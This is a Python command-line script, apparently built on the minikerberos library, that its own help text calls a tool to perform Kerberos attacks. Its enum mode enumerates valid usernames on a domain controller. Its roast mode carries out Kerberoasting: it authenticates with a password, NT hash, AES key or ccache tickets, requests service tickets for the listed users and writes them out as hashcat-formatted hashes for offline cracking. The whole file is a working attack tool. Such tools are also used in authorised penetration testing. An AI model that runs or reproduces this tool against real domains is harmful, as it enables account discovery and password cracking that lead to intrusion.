from minikerberos.security import *
from minikerberos.common import *
from minikerberos.communication import *
import getpass
import sys
import traceback


if __name__ == '__main__':
	import argparse

	parser = argparse.ArgumentParser(description='Tool to perform kerberos attacks')
	parser.add_argument('target', help='IP or Hostname of the kerberos server (the domain controller)')
	parser.add_argument('realm', help='Realm of the domain you are trying to enumerate users in (eg. TEST.corp)')
	parser.add_argument('-v', '--verbose', action='count', default=0)

	subparsers = parser.add_subparsers(help = 'commands')
	subparsers.required = True
	subparsers.dest = 'command'
	enum_group = subparsers.add_parser('enum', help='Enumerate users via Kerberos')
	enum_group.add_argument('-o', '--outfile', help='Output file for enumerated users')
	enum_group.add_argument('-u', action='append', help='Username to enumerate, can be stacked with -u X -u X')
	enum_group.add_argument('-f', help='File with a list of users to enumerate. One user per line')


	kerberoast_group = subparsers.add_parser('roast', help = 'Kerberoast attack')
	kerberoast_group.add_argument('-c','--ccache', help='CCACHE file')
	kerberoast_group.add_argument('-u','--username', help='Username')
	kerberoast_group.add_argument('-o', '--outfile', help='Output file for hashcat formatted tickets')
	kerberoast_group.add_argument('-k', help='AES key')
	kerberoast_group.add_argument('-n', help='NT hash')
	kerberoast_group.add_argument('-p', help='Password')
	kerberoast_group.add_argument('-t', action='append', help='Target username to roast, can be stacked with -t X -t X')
	kerberoast_group.add_argument('-f', help='File with a list of users to roast. One user per line')
	

	args = parser.parse_args()



	if args.verbose == 0:
		logging.basicConfig(level=logging.INFO)
	elif args.verbose == 1:
		logging.basicConfig(level=logging.DEBUG)
	else:
		logging.basicConfig(level=1)

	ksoc = KerberosSocket(args.target)

	if args.command == 'enum':
		#### user enum test
		users = []
		if args.u:
			users += args.u
		
		if args.f:
			with open(args.f,'rb') as f:
				for line in f:
					users.append(line.strip().decode())

		kue = KerberosUserEnum(ksoc)
		existing_users = kue.run(args.realm, users)
		if args.outfile:
			with open(args.outfile, 'wb') as f:
				for user in existing_users:
					f.write(user.encode() + '\r\n')
		else:
			print('Existing users:')
			for user in existing_users:
				print(user)

	elif args.command == 'roast':
		if not args.username and not args.ccache:
			print('Provide either user credentials (user+pass/keys) OR ccache file')

		#generating targets
		targets = []
		users  = []
		if args.t:
			users += args.t
		if args.f:
			with open(args.f, 'rb') as f:
				for line in f:
					users.append(line.strip().decode())

		if len(users) < 1:
			print('Error! No targets were specitifed to roast')
			sys.exit()

		for user in users:
			target = KerberosTarget()
			target.username = user
			target.domain = args.realm #the kerberos realm
			targets.append(target)

		if args.username and not args.ccache:
			kerberos_key_aes_128 = None
			kerberos_key_aes_256 = None
			if args.k:
				try:
					bytearray.fromhex(args.k)
				except Exception as e:
					raise Exception('AES key must be in hex format! %s' % e)
				
				if len(args.k) == 32:
					kerberos_key_aes_128 = args.k
				elif len(args.k) == 64:
					bytearray.fromhex(args.k)
					kerberos_key_aes_256 = args.k
				else:
					raise Exception('Wrong AES key size!')
			
			nt = None
			if args.n:
				try:
					bytearray.fromhex(args.n)
				except Exception as e:
					raise Exception('NT hash must be in hex format! %s' % e)
				
				if len(args.n) != 32:
					raise Exception('NT hash size incorrect')
				
				nt = args.n
				
			password = args.p
			if not args.n and not args.k and not password:
				password = getpass.getpass('Enter password:')


			ccred = KerberosCredential()
			ccred.username = args.username
			ccred.domain = args.realm
			ccred.password = password
			ccred.NT = nt
			ccred.kerberos_key_aes_256 = kerberos_key_aes_256
			ccred.kerberos_key_aes_128 = kerberos_key_aes_128

			kr = Kerberoast(ccred, ksoc)
			hashes = kr.run(targets)
		
		else:
			#ccache file supplied.
			# problem: ccache file might have multiple TGTs in it, not all of them usable
			# solution: try them one by one, if exception happens then we'll continue using a differen tone
			ccache = CCACHE.from_file(args.ccache)
			hashes = []
			for tgt, key in ccache.get_all_tgt():
				try:
					#logging.info('Trying to roast with %s' % tgt['cname']['name-string'])
					logging.info('Trying to roast with %s' % '!'.join(tgt['cname']['name-string']))
					kcomm = KerbrosComm.from_tgt(ksoc, tgt, key)
					kr = Kerberoast(None, ksoc, kcomm = kcomm)
					hashes += kr.run(targets)

				except Exception as e:
					logging.debug('This ticket is not usable it seems Reason: %s' % e)
					continue
				else:
					break

		

		if len(hashes) < 1:
			print('Could not retrieve any hashes.')
			sys.exit()

		if args.outfile:
			with open(args.outfile,'w', newline='') as f:
				for h in hashes:
					f.write(h + '\r\n')

		else:
			for h in hashes:
				print(h)





	